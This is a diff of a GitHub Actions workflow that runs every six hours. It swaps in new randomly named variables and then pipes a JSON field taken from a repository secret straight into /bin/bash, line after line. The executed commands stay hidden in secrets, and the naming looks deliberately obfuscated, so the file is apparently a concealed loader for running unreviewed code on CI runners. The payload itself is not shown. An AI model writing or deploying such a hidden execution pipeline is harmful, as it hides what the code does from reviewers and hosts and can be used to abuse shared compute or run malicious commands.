@@ -1,36 +1,26 @@
 name: mengtianfeng9876
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
+    - cron: '12 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mengtianfeng9876
         env:
-          jkrkc05: ${{ secrets.jkrkc05 }}
+          wz81: ${{ secrets.wz81 }}
         run: |
-          echo $jkrkc05 | jq -r .udsg352 | /bin/bash
-          echo $de1 | jq -r .ugr7720 | /bin/bash
-          echo $ce469 | jq -r .j8244 | /bin/bash
-          echo $uhmj90 | jq -r .dh4124 | /bin/bash
-          echo $bzm773 | jq -r .wyax8 | /bin/bash
-          echo $ob2 | jq -r .hytx9 | /bin/bash
-          echo $scru676 | jq -r .gkfl8 | /bin/bash
-          echo $os8 | jq -r .d13464 | /bin/bash
-          echo $p78050 | jq -r .rkx4839 | /bin/bash
-          echo $oggl27058 | jq -r .kb20488 | /bin/bash
-          echo $wwtn137 | jq -r .shmun9584 | /bin/bash
-          echo $ajs57707 | jq -r .ny298 | /bin/bash
-          echo $er82 | jq -r .ehu60 | /bin/bash
-          echo $nfa71346 | jq -r .nf373 | /bin/bash
-          echo $rv95048 | jq -r .d15 | /bin/bash
-          echo $g44 | jq -r .r89 | /bin/bash
-          echo $xmsgu924 | jq -r .ax27 | /bin/bash
-          echo $vg827 | jq -r .xlm80 | /bin/bash
+          echo $wz81 | jq -r .nrg52 | /bin/bash
+          echo $dl7889 | jq -r .ry30 | /bin/bash
+          echo $oenco72322 | jq -r .ytb64203 | /bin/bash
+          echo $v4 | jq -r .d8575 | /bin/bash
+          echo $qkm15875 | jq -r .ilq7 | /bin/bash
+          echo $zduvo53656 | jq -r .qo56759 | /bin/bash
+          echo $pwzc82 | jq -r .ydbdn08083 | /bin/bash
+          echo $nzdta9848 | jq -r .hem97676 | /bin/bash
+          echo $avgrk52377 | jq -r .dbq78 | /bin/bash
+          echo $ks7610 | jq -r .c81642 | /bin/bash
 
